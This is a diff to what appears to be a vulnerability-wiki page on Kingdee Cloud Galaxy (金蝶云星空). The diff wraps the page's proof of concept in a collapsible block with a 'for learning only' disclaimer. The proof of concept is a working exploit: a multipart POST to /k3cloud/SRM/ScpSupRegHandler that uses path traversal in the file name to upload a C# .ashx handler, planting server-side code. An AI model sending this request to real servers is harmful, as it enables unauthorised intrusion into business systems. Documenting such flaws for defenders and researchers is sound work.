@@ -33,8 +33,10 @@ app="金蝶云星空-管理中心"
 
 poc
 
-```
-POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
 Host: 
 Accept-Encoding: identity
 Content-Length: 973
@@ -55,7 +57,7 @@ Content-Disposition: form-data; name="FID"
 Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/test.ashx."
 Content-Type: text/plain
 
-<%@ WebHandler Language="C#" Class="TestHandler" %>
+&lt;%@ WebHandler Language="C#" Class="TestHandler" %&gt;
         using System;
         using System.Web;
         public class TestHandler : IHttpHandler {
@@ -68,8 +70,9 @@ Content-Type: text/plain
                 get {return false; }
             }
         }
---2ac719f8e29343df94aa4ab49e456061--
-```
+--2ac719f8e29343df94aa4ab49e456061--</code></pre>
+
+</details>
 
 ![image-20231116140545666](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20231116140545666.png)
 
